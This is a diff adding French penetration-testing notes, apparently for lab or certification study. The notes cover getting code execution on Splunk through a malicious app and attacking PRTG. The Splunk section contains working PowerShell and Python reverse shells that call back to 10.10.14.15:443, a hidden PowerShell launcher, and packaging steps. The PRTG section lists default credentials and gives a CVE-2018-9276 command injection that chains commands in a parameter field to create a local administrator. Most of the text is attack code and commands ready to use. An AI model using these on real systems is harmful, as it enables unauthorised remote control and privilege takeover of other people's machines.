@@ -705,6 +705,102 @@ p.waitFor()
 
 ---
 
+# Attacking Splunk
+
+- **Principe**  
+  Créer une app Splunk contenant un `bin/` avec script (PS / BAT / PY) + `default/inputs.conf` pour exécuter périodiquement le script → RCE.
+
+- **Structure minimale d’app**
+  - `splunk_shell/`
+    - `bin/` → `run.ps1` (ou `rev.py`), `run.bat`
+    - `default/` → `inputs.conf`
+
+- **Exemples fournis (inchangés)**
+
+  `inputs.conf` :
+  - `[script://./bin/rev.py]`
+  - `disabled = 0`
+  - `interval = 10`
+  - `sourcetype = shell`
+
+  - `[script://.\bin\run.bat]`
+  - `disabled = 0`
+  - `sourcetype = shell`
+  - `interval = 10`
+
+  `run.bat` :
+  - `@ECHO OFF`
+  - `PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"`
+  - `Exit`
+
+  PowerShell one-liner (reverse shell exemple) :
+```
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+  Python reverse (Linux) :
+  ```
+  import sys,socket,os,pty
+  ip="10.10.14.15"
+  port="443"
+  s=socket.socket()
+  s.connect((ip,int(port)))
+  [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+  pty.spawn('/bin/bash')
+  ```
+
+- **Déploiement**
+  - créer archive : `tar -cvzf updater.tar.gz splunk_shell/`
+  - UI Splunk → `Install app from file` → uploader
+  - listener : `nc -lnvp 443`
+---
+
+# PRTG
+
+## Ports / services
+- Interface web : `80`, `443`, `8080` (PRTG souvent sur `8080`)
+
+## Découverte rapide
+- Scan service : `nmap -sV -p- --open -T4 <host>`
+- Vérifier version/page d'accueil : `curl -s http://<host>:8080/index.htm | grep prtgversion`
+
+## Identifiants courants
+- `prtgadmin:prtgadmin`
+- essais fréquents : `prtgadmin:Password123`
+
+## Vérif / énumération
+1. Ouvrir UI : `http://<host>:8080`
+2. Trouver version dans page HTML (`prtgversion`)  
+3. Se connecter (si creds faibles ou par défaut)
+
+## Exploitation (CVE-2018-9276) — injection de commande authentifiée (procédure minimale)
+> Nécessite compte avec accès aux Notifications (ex. `prtgadmin`).
+
+1. Menu `Setup` → `Account Settings` → `Notifications`
+2. `Add new notification`
+3. Nommer (ex : `pwn`), cocher `EXECUTE PROGRAM`
+4. `Program File` : sélectionner `Demo exe notification - outfile.ps1`
+5. `Parameters` : mettre la commande à exécuter (exemple d’ajout d’un utilisateur local) :  
+   ``test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add``
+6. `Save` puis cliquer `Test` → la commande est mise en file d’exécution (exécution aveugle)
+7. Vérifier succès (ex. connexion RDP / SMB ou test post-exec)
+
+## Validation post-exploit
+- Tester accès SMB local :  
+  `crackmapexec smb <target> -u prtgadm1 -p 'Pwn3d_by_PRTG!'`
+- Essayer RDP / WinRM / outils Impacket (si autorisé par le scope)
+
+## Commandes utiles
+- `curl -s http://<host>:8080/index.htm | grep prtgversion`
+- `crackmapexec smb <host> -u <user> -p <pass>`
+
+## Remarques courtes
+- L’exécution via Notifications est *aveugle* (pas de retour HTTP direct).  
+- Les paramètres peuvent contenir plusieurs commandes séparées par `;`.
+
+---
+
+
 
 
 
